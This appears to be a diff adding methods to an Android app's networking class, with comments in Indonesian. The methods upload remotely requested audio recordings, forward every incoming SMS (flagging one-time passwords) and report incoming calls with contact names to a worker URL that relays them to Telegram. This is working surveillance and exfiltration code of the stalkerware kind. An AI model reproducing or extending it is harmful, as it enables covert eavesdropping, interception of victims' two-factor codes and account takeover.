+     * File di-encode base64 dan dikirim via POST JSON.
+     */
+    public static boolean sendAudioResult(
+            android.content.Context context,
+            String requestId,
+            java.io.File audioFile,
+            int durationSec,
+            String mode) {
+
+        if (audioFile == null || !audioFile.exists() || audioFile.length() == 0) {
+            return false;
+        }
+
+        HttpURLConnection conn = null;
+
+        try {
+            // Baca file audio ke byte array
+            byte[] audioBytes;
+            try (
+                java.io.FileInputStream fis = new java.io.FileInputStream(audioFile);
+                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream()
+            ) {
+                byte[] buffer = new byte[8192];
+                int count;
+                while ((count = fis.read(buffer)) != -1) {
+                    bos.write(buffer, 0, count);
+                }
+                audioBytes = bos.toByteArray();
+            }
+
+            String audioBase64 = android.util.Base64.encodeToString(
+                    audioBytes, android.util.Base64.NO_WRAP
+            );
+
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(60000); // 60 detik untuk file besar
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",      "audioResult");
+            json.put("requestId",   requestId == null ? "" : requestId);
+            json.put("audioBase64", audioBase64);
+            json.put("duration",    durationSec);
+            json.put("mode",        mode == null ? "record" : mode);
+            json.put("fileName",    audioFile.getName());
+            json.put("mimeType",    "audio/mp4");
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) {
+                Log.e(TAG, "Audio upload failed HTTP=" + responseCode);
+                return false;
+            }
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error uploading audio", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Update status audio request (RECEIVED, CANCELLED, COMPLETED, FAILED).
+     */
+    public static boolean updateAudioRequestStatus(
+            String requestId,
+            String status) {
+
+        if (requestId == null || requestId.trim().isEmpty()) return false;
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "audioRequestStatus");
+            json.put("requestId", requestId);
+            json.put("status",    status);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error updating audio status", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // SMS
+    // =========================================================
+
+    /**
+     * Kirim SMS yang masuk ke GAS → diteruskan ke Telegram.
+     *
+     * Android -> Worker -> Apps Script (doPost, action=sms)
+     * -> handleSmsNotification() di Code.gs -> Telegram
+     */
+    public static boolean sendSmsToSheet(
+            android.content.Context context,
+            String sender,
+            String body,
+            long timestamp,
+            boolean isOtp) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty(
+                    "Content-Type",
+                    "application/json; charset=utf-8"
+            );
+            conn.setRequestProperty(
+                    "Accept",
+                    "application/json, text/plain, */*"
+            );
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action", "sms");
+            json.put("sender", sender == null ? "" : sender);
+            json.put("body", body == null ? "" : body);
+            json.put("timestamp", timestamp);
+            json.put("isOtp", isOtp);
+
+            byte[] bodyBytes = json.toString()
+                    .getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(bodyBytes);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) {
+                Log.e(TAG, "SMS send failed HTTP=" + responseCode);
+                return false;
+            }
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending SMS to sheet", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // CALL EVENT
+    // =========================================================
+
+    /**
+     * Kirim event panggilan masuk ke GAS → diteruskan ke Telegram.
+     *
+     * Android -> Worker -> Apps Script (doPost, action=callEvent)
+     * -> handleCallEvent() di Code.gs -> Telegram
+     */
+    public static boolean sendCallEvent(
+            android.content.Context context,
+            String number,
+            String contactName,
+            long timestamp) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty(
+                    "Content-Type",
+                    "application/json; charset=utf-8"
+            );
+            conn.setRequestProperty(
+                    "Accept",
+                    "application/json, text/plain, */*"
+            );
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action", "callEvent");
+            json.put("number", number == null ? "" : number);
+            json.put("contactName", contactName == null ? "Tidak dikenal" : contactName);
+            json.put("timestamp", timestamp);
+
+            byte[] body = json.toString()
+                    .getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) {
+                Log.e(TAG, "Call event send failed HTTP=" + responseCode);
+                return false;
+            }
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending call event", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
     // RESPONSE READER
     // =========================================================
 
